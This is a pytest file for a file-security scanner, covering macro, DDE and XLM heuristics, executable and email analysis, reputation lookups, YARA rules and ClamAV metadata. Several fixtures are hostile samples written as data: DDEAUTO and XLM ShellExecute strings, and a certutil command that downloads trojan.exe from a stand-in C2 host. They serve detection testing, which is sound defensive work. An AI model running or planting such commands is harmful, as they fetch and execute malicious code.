import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
from app.analyzers.didier_oledump import DidierOledumpAnalyzer
from app.analyzers.executable_analyzer import ExecutableAnalyzer
from app.sanitizers.executable_sanitizer import ExecutableSanitizer
from app.sanitizers.base import SanitizationOptions
from app.analyzers.email_analyzer import EmailAnalyzer
from app.analyzers.reputation_client import ThreatFoxClient, UrlScanClient, CirclHashlookupClient
from app.core.clamav_manager import ClamAVManager
from app.core.yara_manager import YaraManager

def test_didier_oledump_empty_or_non_ole(tmp_path):
    f = tmp_path / "dummy.bin"
    f.write_bytes(b"not an ole file")
    res = DidierOledumpAnalyzer.analyze_file(f)
    assert res["is_ole"] is False
    assert res["streams"] == []

def test_didier_oledump_xlm_and_dde_heuristics():
    raw_with_dde = b"Header... \x00\x00 DDEAUTO \"C:\\\\Windows\\\\System32\\\\cmd.exe\" \"/c calc.exe\" \x00"
    indicator, has_macro, has_xlm, has_dde = DidierOledumpAnalyzer._inspect_stream_bytes("Macros/TestStream", raw_with_dde)
    assert has_dde is True
    assert "D" in indicator

    raw_with_xlm = b"Workbook ... Auto_Open ... CALL(\"Shell32\",\"ShellExecuteA\",...) ... HALT()"
    indicator_x, has_macro_x, has_xlm_x, has_dde_x = DidierOledumpAnalyzer._inspect_stream_bytes("Macros/XLMStream", raw_with_xlm)
    assert has_xlm_x is True
    assert "X" in indicator_x

def test_executable_analyzer_elf_detection(tmp_path):
    # Minimal 64-bit ELF header
    elf_header = bytearray(64)
    elf_header[0:4] = b"\x7fELF"
    elf_header[4] = 2  # 64-bit
    elf_header[5] = 1  # Little endian
    elf_header[6] = 1  # ELF version 1
    elf_header[16:18] = b"\x02\x00"  # ET_EXEC
    elf_header[18:20] = b"\x3e\x00"  # x86-64

    f = tmp_path / "test.elf"
    f.write_bytes(elf_header)

    analyzer = ExecutableAnalyzer()
    res = analyzer.analyze(f, "test.elf", "application/x-executable")
    assert res.success is True
    assert "ELF" in res.data.get("format", "")
    assert "64-bit" in res.data.get("architecture", "")

def test_executable_analyzer_macho_detection(tmp_path):
    # Mach-O 64-bit header (0xfeedfacf)
    macho_header = bytearray(32)
    macho_header[0:4] = b"\xcf\xfa\xed\xfe"  # Little-endian MH_MAGIC_64
    macho_header[4:8] = (0x01000007).to_bytes(4, 'little')  # CPU_TYPE_X86_64
    macho_header[8:12] = (3).to_bytes(4, 'little')  # CPU_SUBTYPE_X86_ALL
    macho_header[12:16] = (2).to_bytes(4, 'little')  # MH_EXECUTE

    f = tmp_path / "test.macho"
    f.write_bytes(macho_header)

    analyzer = ExecutableAnalyzer()
    res = analyzer.analyze(f, "test.macho", "application/x-mach-binary")
    assert res.success is True
    assert "Mach-O" in res.data.get("format", "")

def test_executable_sanitizer_disarm(tmp_path):
    f = tmp_path / "sample.exe"
    f.write_bytes(b"MZ" + b"\x90" * 200)

    sanitizer = ExecutableSanitizer()
    out_file = tmp_path / "sample_disarmed.pdf"
    options = SanitizationOptions(convert_to_pdf=True)
    res = sanitizer.sanitize(f, out_file, options, original_filename="sample.exe")
    assert res.success is True
    assert out_file.exists()
    assert len(res.removed_items) > 0

def test_email_analyzer_eml_and_msg():
    analyzer = EmailAnalyzer()
    app_dir = Path("/app")

    # If running inside container where test files were placed in /app
    eml_file = app_dir / "phishing_credential_alert.eml"
    msg_file = app_dir / "phishing_credential_alert.msg"

    if eml_file.exists():
        res_eml = analyzer.analyze(eml_file, eml_file.name, "message/rfc822")
        assert res_eml.success is True
        assert res_eml.data.get("tracking_pixel_count", 0) >= 1
        assert len(res_eml.data.get("urls", [])) >= 1

    if msg_file.exists():
        res_msg = analyzer.analyze(msg_file, msg_file.name, "application/vnd.ms-outlook")
        assert res_msg.success is True
        assert res_msg.data.get("tracking_pixel_count", 0) >= 1

    spf_file = app_dir / "spoofed_dkim_spf_failure.eml"
    if spf_file.exists():
        res_spf = analyzer.analyze(spf_file, spf_file.name, "message/rfc822")
        assert res_spf.success is True
        titles = [f.title for f in res_spf.findings]
        assert any("SPF" in t for t in titles)
        assert any("DKIM" in t for t in titles)

def test_reputation_clients_mocked():
    with patch("httpx.Client.post") as mock_post:
        mock_post.return_value = MagicMock(
            status_code=200,
            json=lambda: {
                "query_status": "ok",
                "data": [{
                    "ioc": "http://evil-c2.test/payload.exe",
                    "threat_type": "payload_delivery",
                    "malware": "win.redline",
                    "confidence_level": 90
                }]
            }
        )
        res = ThreatFoxClient.check_ioc("http://evil-c2.test/payload.exe", custom_key="mock_key")
        assert res is not None
        assert res["malware"] == "win.redline"
        assert res["confidence"] == 90
        assert res["status"] == "MALICIOUS"

    with patch("httpx.Client.get") as mock_get:
        mock_get.return_value = MagicMock(
            status_code=200,
            json=lambda: {
                "results": [{
                    "page": {
                        "url": "https://suspicious-login.test",
                        "domain": "suspicious-login.test",
                        "asnname": "Cloudflare",
                        "country": "US"
                    },
                    "verdicts": {
                        "overall": {"malicious": True, "score": 95, "categories": ["phishing"]}
                    }
                }]
            }
        )
        res = UrlScanClient.check_url("https://suspicious-login.test", custom_key="mock_key")
        assert res is not None
        assert res["malicious"] is True
        assert res["score"] == 95
        assert res["status"] == "MALICIOUS"

    with patch("httpx.Client.get") as mock_get_circl:
        mock_get_circl.return_value = MagicMock(
            status_code=200,
            json=lambda: {
                "FileName": "calc.exe",
                "ProductCode": "Windows",
                "OpSystemCode": "Microsoft Windows"
            }
        )
        res = CirclHashlookupClient.check_hash("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
        assert res is not None
        assert res.get("is_nsrl") is True
        assert res.get("status") == "BENIGN_KNOWN"
        assert res.get("file_name") == "calc.exe"

def test_yara_new_rules_compilation(tmp_path):
    ym = YaraManager()
    rules = ym.list_rules()
    rule_ids = [r["id"] for r in rules]
    assert "builtin_office_dde_xlm" in rule_ids
    assert "builtin_lolbins_execution" in rule_ids

    test_dde = tmp_path / "test_dde.doc"
    test_dde.write_bytes(b"This is a sample document containing =DDEAUTO(\"cmd.exe\", \"/c calc\")")
    matches = ym.scan_file(test_dde, "OFFICE")
    matched_names = [m["rule_name"] for m in matches]
    assert any("DDE" in name for name in matched_names)

    test_lolbin = tmp_path / "test_lolbin.txt"
    test_lolbin.write_bytes(b"certutil -urlcache -split -f http://malicious-c2.test/trojan.exe trojan.exe")
    matches_lol = ym.scan_file(test_lolbin, "ALL")
    matched_names_lol = [m["rule_name"] for m in matches_lol]
    assert any("Living-off-the-Land" in name or "LOLBins" in name for name in matched_names_lol)

def test_clamav_community_signatures_metadata():
    cm = ClamAVManager()
    info = cm.get_info()
    assert "community_signatures" in info
    cs = info["community_signatures"]
    assert "securiteinfo" in cs
    assert "sanesecurity" in cs
    assert cs["securiteinfo"]["name"] == "SecuriteInfo Free Database"
    assert "Sanesecurity" in cs["sanesecurity"]["name"]
